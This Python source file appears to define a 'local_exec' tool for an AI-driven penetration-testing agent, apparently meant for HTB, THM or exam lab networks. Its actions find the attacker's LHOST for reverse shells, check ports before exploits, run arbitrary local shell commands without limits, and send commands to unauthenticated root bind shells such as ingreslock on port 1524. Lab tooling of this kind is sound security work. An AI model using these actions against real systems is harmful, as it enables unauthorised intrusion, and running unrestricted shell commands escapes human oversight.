"""
TIRPAN — Local Machine Exec Tool
==================================
Runs commands on the attacker's own machine (not the target).

Actions:
  ip_info        — return local IP addresses and network interfaces
  ping           — ICMP reachability check to target
  port_check     — TCP connect test to verify a target port is open before exploiting
  run            — execute an arbitrary local shell command (default timeout 30s)
  bindshell_exec — connect to a raw TCP bind shell and send commands (e.g. port 1524)
"""

from __future__ import annotations

import asyncio
import logging
import re
import socket

from tools.base_tool import BaseTool, ToolHealthStatus, ToolMetadata

logger = logging.getLogger(__name__)

_DEFAULT_TIMEOUT = 5
_RUN_TIMEOUT = 30        # default for action=run (nc / shell commands can take time)
_PING_TIMEOUT = 5


class LocalExecTool(BaseTool):

    @property
    def metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="local_exec",
            category="recon",
            description=(
                "Run commands on YOUR OWN attacker machine (not the target). "
                "Actions:\n"
                "  ip_info        — list local IP addresses and network interfaces\n"
                "  ping           — check ICMP reachability to a target IP\n"
                "  port_check     — TCP connect test to target:port (verify service is up)\n"
                "  run            — execute an arbitrary local shell command (default timeout 30s)\n"
                "  bindshell_exec — connect to a raw bind shell (e.g. ingreslock port 1524) and\n"
                "                   send a list of commands, returning their output. Use this for\n"
                "                   ports that expose a root shell directly (no MSF needed).\n"
                "Use ip_info to discover your LHOST before running reverse-shell exploits.\n"
                "Use port_check before every exploit to confirm the target port is actually open."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "description": "'ip_info' | 'ping' | 'port_check' | 'run' | 'bindshell_exec'",
                        "default": "ip_info",
                    },
                    "target_ip": {
                        "type": "string",
                        "description": "Target IP address (for ping / port_check)",
                        "default": "",
                    },
                    "port": {
                        "type": "integer",
                        "description": "Target port number (for port_check)",
                        "default": 0,
                    },
                    "command": {
                        "type": "string",
                        "description": "Shell command to run locally (for action=run)",
                        "default": "",
                    },
                    "commands": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "List of shell commands to send to a raw bind shell (for bindshell_exec)",
                        "default": [],
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Timeout in seconds (default 5 for port_check/ping, 30 for run)",
                        "default": 5,
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(self, params: dict) -> dict:
        action = params.get("action", "ip_info")
        target_ip = params.get("target_ip", "").strip()
        port = int(params.get("port", 0))
        command = params.get("command", "").strip()
        timeout = int(params.get("timeout", _DEFAULT_TIMEOUT))

        if action == "ip_info":
            return await self._ip_info()
        elif action == "ping":
            if not target_ip:
                return {"success": False, "output": None, "error": "target_ip required for ping"}
            return await self._ping(target_ip, timeout)
        elif action == "port_check":
            if not target_ip or not port:
                return {"success": False, "output": None, "error": "target_ip and port required for port_check"}
            return await self._port_check(target_ip, port, timeout)
        elif action == "run":
            if not command:
                return {"success": False, "output": None, "error": "command required for run"}
            # Use the longer default for run if caller didn't override
            run_timeout = int(params.get("timeout", _RUN_TIMEOUT))
            return await self._run_command(command, run_timeout)
        elif action == "bindshell_exec":
            if not target_ip or not port:
                return {"success": False, "output": None, "error": "target_ip and port required for bindshell_exec"}
            commands_raw = params.get("commands", [])
            commands = commands_raw if isinstance(commands_raw, list) else [commands_raw]
            return await self._bindshell_exec(target_ip, port, commands, timeout)
        else:
            return {"success": False, "output": None, "error": f"Unknown action: {action}"}

    async def _ip_info(self) -> dict:
        """Return local IP addresses and interfaces."""
        interfaces: list[dict] = []

        # Try ip addr first (Linux)
        try:
            proc = await asyncio.create_subprocess_exec(
                "ip", "addr",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
            output = stdout.decode(errors="replace")

            current_iface = ""
            for line in output.splitlines():
                m_iface = re.match(r"^\d+:\s+(\S+):", line)
                if m_iface:
                    current_iface = m_iface.group(1).rstrip(":")
                m_inet = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", line)
                if m_inet and current_iface:
                    ip = m_inet.group(1)
                    prefix = m_inet.group(2)
                    if not ip.startswith("127."):
                        interfaces.append({
                            "interface": current_iface,
                            "ip": ip,
                            "prefix": prefix,
                        })
        except Exception:
            pass

        # Fallback: hostname -I (no internet needed)
        if not interfaces:
            try:
                proc2 = await asyncio.create_subprocess_exec(
                    "hostname", "-I",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout2, _ = await asyncio.wait_for(proc2.communicate(), timeout=3)
                for ip in stdout2.decode(errors="replace").split():
                    if re.match(r"^\d+\.\d+\.\d+\.\d+$", ip) and not ip.startswith("127."):
                        interfaces.append({"interface": "default", "ip": ip, "prefix": "?"})
                        break
            except Exception:
                pass

        # Also include hostname
        try:
            hostname = socket.gethostname()
        except Exception:
            hostname = "unknown"

        return {
            "success": bool(interfaces),
            "output": {
                "hostname": hostname,
                "interfaces": interfaces,
                "primary_ip": interfaces[0]["ip"] if interfaces else None,
                "note": (
                    "Use primary_ip as LHOST for reverse shell payloads. "
                    "Prefer VPN/tun interface if present (HTB/THM/exam networks)."
                ),
            },
            "error": None if interfaces else "Could not determine local IP addresses",
        }

    async def _ping(self, target_ip: str, timeout: int) -> dict:
        """ICMP ping to check target reachability."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "ping", "-c", "3", "-W", str(timeout), target_ip,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(
                proc.communicate(), timeout=timeout + 5
            )
            output = stdout.decode(errors="replace")
            reachable = proc.returncode == 0
            # Extract packet loss
            loss_match = re.search(r"(\d+)%\s+packet loss", output)
            loss = int(loss_match.group(1)) if loss_match else 100
            return {
                "success": reachable,
                "output": {
                    "target_ip": target_ip,
                    "reachable": reachable,
                    "packet_loss_pct": loss,
                    "raw": output.strip(),
                },
                "error": None if reachable else f"Target {target_ip} is not reachable (packet loss: {loss}%)",
            }
        except asyncio.TimeoutError:
            return {"success": False, "output": None, "error": f"Ping to {target_ip} timed out"}
        except Exception as e:
            return {"success": False, "output": None, "error": str(e)}

    async def _port_check(self, target_ip: str, port: int, timeout: int) -> dict:
        """TCP connect test — verify a port is open before attempting exploit."""
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(target_ip, port),
                timeout=timeout,
            )
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            return {
                "success": True,
                "output": {
                    "target_ip": target_ip,
                    "port": port,
                    "state": "open",
                    "note": f"Port {port} is open on {target_ip} — safe to attempt exploit.",
                },
                "error": None,
            }
        except (ConnectionRefusedError, OSError):
            return {
                "success": False,
                "output": {
                    "target_ip": target_ip,
                    "port": port,
                    "state": "closed",
                    "note": f"Port {port} is closed on {target_ip} — skip this exploit vector.",
                },
                "error": f"Port {port} is closed or filtered on {target_ip}",
            }
        except asyncio.TimeoutError:
            return {
                "success": False,
                "output": {
                    "target_ip": target_ip,
                    "port": port,
                    "state": "filtered",
                    "note": f"Port {port} did not respond — likely filtered.",
                },
                "error": f"Timeout connecting to {target_ip}:{port} — port may be filtered",
            }

    async def _run_command(self, command: str, timeout: int) -> dict:
        """Run an arbitrary local shell command on the attacker machine."""
        try:
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=timeout
            )
            out = stdout.decode(errors="replace").strip()
            err = stderr.decode(errors="replace").strip()
            success = proc.returncode == 0 or bool(out)
            return {
                "success": success,
                "output": {
                    "command": command,
                    "stdout": out,
                    "stderr": err,
                    "return_code": proc.returncode,
                },
                "error": None if success else (err or f"Command exited with code {proc.returncode}"),
            }
        except asyncio.TimeoutError:
            return {"success": False, "output": None, "error": f"Command timed out after {timeout}s"}
        except Exception as e:
            return {"success": False, "output": None, "error": str(e)}

    async def _bindshell_exec(
        self, target_ip: str, port: int, commands: list[str], timeout: int
    ) -> dict:
        """Connect to a raw bind shell and send commands, collecting output.

        Used for services like ingreslock (port 1524) on legacy/vulnerable systems that expose
        a root shell directly without any authentication — just TCP connect and send commands.
        """
        effective_timeout = timeout if timeout > _DEFAULT_TIMEOUT else 15
        collected: list[str] = []
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target_ip, port),
                timeout=effective_timeout,
            )
            # Read any banner / prompt
            try:
                banner = await asyncio.wait_for(reader.read(1024), timeout=2)
                if banner:
                    collected.append(banner.decode(errors="replace").strip())
            except asyncio.TimeoutError:
                pass

            for cmd in commands:
                writer.write((cmd + "\n").encode())
                await writer.drain()
                # Give the shell time to process and respond
                await asyncio.sleep(0.5)
                try:
                    chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                    if chunk:
                        collected.append(chunk.decode(errors="replace").strip())
                except asyncio.TimeoutError:
                    pass

            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

            output_text = "\n".join(collected)
            return {
                "success": bool(output_text),
                "output": {
                    "target_ip": target_ip,
                    "port": port,
                    "commands_sent": commands,
                    "output": output_text,
                },
                "error": None if output_text else "Connected but received no output",
            }
        except (ConnectionRefusedError, OSError) as e:
            return {"success": False, "output": None, "error": f"Connection refused: {e}"}
        except asyncio.TimeoutError:
            return {"success": False, "output": None, "error": f"Timed out connecting to {target_ip}:{port}"}
        except Exception as e:
            return {"success": False, "output": None, "error": str(e)}

    async def health_check(self) -> ToolHealthStatus:
        return ToolHealthStatus(available=True, message="local_exec tool ready")
